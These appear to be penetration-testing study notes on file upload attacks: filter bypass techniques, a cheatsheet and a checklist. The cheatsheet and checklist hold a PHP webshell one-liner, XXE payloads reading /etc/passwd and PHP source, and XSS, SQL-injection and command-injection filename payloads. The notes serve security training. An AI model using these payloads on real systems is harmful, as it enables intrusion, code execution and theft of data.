---
title: File Upload Attacks
tags: [module]
---

## Notes

### Client-Side Validation Bypass
Many web applications rely on front-end JavaScript to validate uploads before they reach the server. This is trivial to bypass — the validation runs on your browser, which you control.

Two signs a filter is client-side only:
- Selecting a disallowed file shows an error without ever sending a request to the server
- The validation logic is visible in the page's JavaScript

**How to bypass:**

1. **Modify the request directly.** Upload an allowed file (like `image.png`), capture the request in Burp, and change the `filename="image.png"` to `filename="shell.php"` and swap the body. The server never sees the JS filter.
2. **Disable the validation in the browser.** Open DevTools, find the validation function (often called via `onchange` on the file input), and remove it before uploading. This also neutralizes any `required` attributes on the form that prevent submission.

Rule of thumb: delete only the validation function itself. Removing too much can break the upload form entirely.

### Blacklist Extension Bypass
Blacklists are the weakest form of extension validation because PHP alone has close to a dozen valid extensions (`.php`, `.phtml`, `.phar`, `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phps`). Blocking all of them is a losing game.

**Methodology:**

1. Try uploading a `.php` file and note the exact error message
2. Send the request to Burp Intruder, mark the extension as a payload, and fuzz with a list of PHP-equivalent extensions (uncheck URL-encoding)
3. Look for responses with different sizes/status codes — those are allowed
4. Test each allowed extension to see which ones the web server actually executes as PHP

A common finding: `.phar` passes the blacklist and executes as PHP on most Apache setups.

Case-sensitive blacklists can often be bypassed by changing one letter (`.pHp`, `.Php`).

### Whitelist Extension Bypass
Whitelists are stronger but still break when the developer writes bad regex.

**Unanchored regex (missing `$`):**
```php
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) { ... }
```
This only checks that the allowed extension appears anywhere in the name. Upload `shell.jpg.php` — it contains `.jpg`, passes the check, and the server executes it as PHP.

**Reverse double extension (anchored regex but weak Apache config):**
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ... }
```
The regex is tight — the name must end with an image extension. But Apache may be configured with:
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```
This handler matches any file whose name *contains* `.php`, `.phar`, or `.phtml` — anywhere. Upload `shell.php.jpg`: it ends in `.jpg` (passes upload filter) and contains `.php` (triggers PHP handler) → executes.

**Root cause:** suffix check vs substring check. Pick a name that satisfies both.

### Character Injection
Some older or misconfigured servers can be confused by non-printable or special characters placed around the extension:

- `%00` (null byte) — PHP 5.x and earlier terminate the filename here
- `:` — on Windows servers, `shell.aspx:.png` can execute as `.aspx`
- `%20`, `%0a`, `%0d0a`, `/`, `.\`, `…` — various misinterpretations depending on OS/parser

Generate a permutation wordlist with a quick bash loop and fuzz it through Intruder.

### MIME Type and Content-Type Filters
Modern servers often inspect the file's actual content, not just its extension.

**Content-Type header filter:** The `Content-Type` sent in the multipart upload is set by your browser, which means you can tamper with it. Change `Content-Type: application/x-php` to `Content-Type: image/png` and the filter passes while your PHP file still gets stored.

Remember: a multipart file upload has **two** `Content-Type` headers — one for the full request (at the top) and one for the attached file (next to the file body). Usually you modify the file's header, not the request's. Some apps that read the request header require you modify that one instead.

**MIME-Type / magic byte filter:** The server reads the first few bytes (the "magic bytes") to determine the real file type. Bypass by prepending or embedding valid magic bytes:
- GIF: `GIF87a` or `GIF89a` (printable ASCII — easiest to fake)
- PNG: `\x89PNG\r\n\x1a\n` (non-printable)
- JPEG: `\xFF\xD8\xFF\xE0` (non-printable)

For text-based payloads (PHP), GIF is the easiest signature to fake because it's printable. Put `GIF8` at the start of your `.phar` file, then your PHP code after — the file passes magic byte checks and still executes.

**Combining filters (the gotcha):** Real apps often stack filters. You may need to:
1. Fake magic bytes (passes MIME filter)
2. Spoof Content-Type (passes header filter)
3. Use an allowed extension (passes extension filter) — e.g. `shell.jpeg.phar`

Order matters: `shell.phar.jpeg` may fail where `shell.jpeg.phar` succeeds, depending on which filter runs first and how execution is configured.

### Limited Upload Exploitation
Even when you can't upload executable code, non-image file types can still be dangerous.

**HTML files:** If `.html` is allowed, embed JavaScript directly — the file becomes stored XSS when a victim visits it.

**SVG files:** SVG is XML. The browser renders it as an image, but it can contain `<script>` tags:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(window.origin)</script>
</svg>
```
Stored XSS without needing to escape an HTML context.

**XXE via SVG:** Since SVG is XML, you can define external entities to make the server read local files:
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
To read PHP source (which would break the XML parser if raw), use the PHP base64 filter:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```
Same trick works in PDF, Word, PowerPoint — they're all XML internally.

**Image metadata XSS:** If the app displays EXIF/IPTC metadata:
```bash
exiftool -Artist='"><script>alert(1)</script>' profile.jpg
```
The leading `"><` breaks out of a surrounding HTML attribute.

### Filename-Based Attacks
The filename itself is user input, and apps sometimes use it unsafely.

- **OS command injection:** `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami` — if the app shells out to move/process the file
- **XSS via filename:** `<script>alert(1)</script>.jpg` — fires if the filename is displayed to other users
- **SQLi via filename:** `file';SELECT+SLEEP(5);--.jpg` — fires if the filename is used in a query without sanitization

### Upload Directory Disclosure
You need to know where your shell landed to trigger it.

- Fuzz common upload paths (`/uploads/`, `/files/`, `/images/`, `/media/`)
- Force errors to leak the path: upload a file 5000+ chars long, or upload a duplicate filename
- Use another vuln (LFI, XXE) to read the app's source and locate the upload handler

### DoS and Other Advanced Vectors
- **Decompression bombs** — nested ZIPs that expand to petabytes
- **Pixel flood** — tiny JPG/PNG with faked 0xffff×0xffff dimensions, OOMs on render
- **Oversized files** — no size limit → fill the disk
- **Directory traversal in filename** — `../../../etc/passwd` to crash or overwrite
- **Library bugs** — post-upload transcoding, compression, or renaming libraries have historic vulns (ffmpeg AVI→XXE is a classic)

### Windows-Specific Tricks
- **Reserved characters** (`| < > * ?`) in filenames can throw disclosive errors or reference other files
- **Reserved device names** (`CON`, `COM1`, `LPT1`, `NUL`) — the OS refuses to create these, causing errors
- **8.3 short filename convention** — old Windows truncates long names: `hackthebox.txt` → `HAC~1.TXT`. Use this to target files you couldn't otherwise name: `WEB~1.CON` → `web.conf`

### Defender Perspective
Understanding defenses helps you spot weak ones:

- Whitelist + blacklist together (whitelist primary, blacklist backstop against `shell.php.jpg`)
- Validate both Content-Type and actual MIME/magic bytes, and make sure extension and content agree
- Serve uploads through a controlled script, not direct file access — 403 on direct requests
- Randomize stored filenames; keep the real name in a DB
- Serve with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`
- Isolate uploads on a separate container; use PHP `disable_functions`

## Cheatsheet

### PHP Webshell One-Liner
```php
<?php system($_GET['cmd']); ?>
```

### Alternate PHP Extensions to Fuzz
```
.php, .phtml, .phar, .php3, .php4, .php5, .php7, .pht, .phps, .pHp
```

### Alternate ASP/ASPX Extensions
```
.asp, .aspx, .ashx, .asmx, .cer, .asa, .cshtml
```

### JSP Extensions
```
.jsp, .jspx, .jsw, .jsv, .jspf
```

### Fake Magic Bytes (prepend to shell)
```
GIF8;   # GIF — easiest, printable ASCII
\x89PNG\r\n\x1a\n   # PNG
\xFF\xD8\xFF\xE0   # JPEG
%PDF-1.4   # PDF
```

### Double Extension Permutations
```
shell.php.jpg         # unanchored regex bypass
shell.jpg.php         # trailing-extension handler bypass
shell.phar.jpg
shell.jpeg.phar
shell.pHp.jpg
```

### Character Injection Wordlist (bash)
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
  for ext in '.php' '.phps' '.phar'; do
    echo "shell$char$ext.jpg"       >> wordlist.txt
    echo "shell$ext$char.jpg"       >> wordlist.txt
    echo "shell.jpg$char$ext"       >> wordlist.txt
    echo "shell.jpg$ext$char"       >> wordlist.txt
  done
done
```

### SVG XSS Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
  <script type="text/javascript">alert(window.origin)</script>
</svg>
```

### SVG XXE — Read File
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### SVG XXE — Read PHP Source (base64)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### EXIF Metadata XSS Injection
```bash
exiftool -Artist='"><script>alert(1)</script>' profile.jpg
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

### Filename Payloads
```
file$(whoami).jpg                         # command injection
file`whoami`.jpg                          # command injection (backticks)
file.jpg||whoami                          # command injection (shell operator)
<script>alert(1)</script>.jpg             # filename XSS
file';SELECT+SLEEP(5);--.jpg              # filename SQLi
```

### Windows 8.3 Short Name Targeting
```
WEB~1.CON    # targets web.conf
CON          # reserved device name — causes error
```

### Content-Type Header Swap (Burp)
```http
Content-Disposition: form-data; name="file"; filename="shell.phar"
Content-Type: image/png
```

### Wordlists
```
SecLists/Discovery/Web-Content/web-all-content-types.txt
SecLists/Fuzzing/UploadFileExtensions.txt
```

## Checklist

### Recon the Upload Function
- [ ] Identify every file upload endpoint in the application
- [ ] Note the stated allowed file types (from UI hints, help text, error messages)
- [ ] Determine if validation is client-side only (upload without a network request → client-side)
- [ ] Capture a successful upload in Burp and study the request structure (multipart boundaries, headers)
- [ ] Note any post-upload URL or path that indicates where files are stored

### Client-Side Filter Bypass
- [ ] Try selecting a disallowed file — does the request reach the server?
- [ ] Open DevTools, locate the JS validation function, and disable or delete it
- [ ] Alternatively, upload an allowed file and modify the request in Burp to swap filename and content

### Extension Filter Bypass (Blacklist)
- [ ] Attempt `.php` upload and record the exact server error message
- [ ] Send request to Burp Intruder, fuzz extension field with PHP-equivalent list
- [ ] Uncheck URL-encoding in Intruder payload settings
- [ ] Identify extensions that receive a different response (different size or status code)
- [ ] Verify each allowed extension actually executes as PHP (upload a `<?php echo "x"; ?>` test)
- [ ] Try mixed-case bypass (`.pHp`, `.PHP`, `.PhAr`)

### Extension Filter Bypass (Whitelist)
- [ ] Try double extension: `shell.php.jpg`
- [ ] Try reverse double extension: `shell.jpg.php`
- [ ] Try reverse with alternate PHP extension: `shell.jpeg.phar`
- [ ] Try character injection permutations (null byte, `%20`, `:`, `.\`, etc.)

### MIME/Content-Type Filter Bypass
- [ ] Capture upload in Burp; change the file's `Content-Type` to `image/png` or `image/gif`
- [ ] Also test changing the request's top-level `Content-Type` header
- [ ] Prepend valid magic bytes to your payload (`GIF8` for easiest ASCII spoof)
- [ ] Try combinations: valid magic bytes + spoofed Content-Type + allowed extension
- [ ] If filter is strict, append payload at END of valid image file (bypass checks that only read file head)

### Limited Upload Exploitation
- [ ] If HTML allowed: upload file with embedded `<script>` for stored XSS
- [ ] If SVG allowed: upload SVG with `<script>` for stored XSS
- [ ] If SVG allowed: upload SVG with XXE payload targeting `/etc/passwd`
- [ ] If SVG XXE confirmed: extract app source via `php://filter` base64 encoding
- [ ] If image metadata is displayed: inject XSS via `exiftool -Artist` or `-Comment`

### Filename Attack Surface
- [ ] Try filename command injection: `file$(whoami).jpg`
- [ ] Try filename XSS: `<script>alert(1)</script>.jpg`
- [ ] Try filename SQLi: `file';SELECT+SLEEP(5);--.jpg`
- [ ] On Windows targets: test reserved names (`CON`, `COM1`) and 8.3 short names

### Post-Upload
- [ ] Locate where uploaded files are stored (fuzz `/uploads/`, `/files/`, `/media/`)
- [ ] If directory listing works, browse for your shell
- [ ] If not, use the filename or ID returned by the upload response
- [ ] Trigger the shell: `GET /uploads/shell.phar?cmd=id`
- [ ] Upgrade to reverse shell once RCE is confirmed

### Advanced / Defense-In-Depth
- [ ] Test oversized files, duplicate filenames, 5000-char filenames for path disclosure
- [ ] Test decompression bomb if the app auto-unzips uploads
- [ ] Check if uploads are served with `Content-Disposition: attachment` (less useful if yes)
- [ ] Research the processing library (ffmpeg, ImageMagick) for known CVEs if transcoding happens
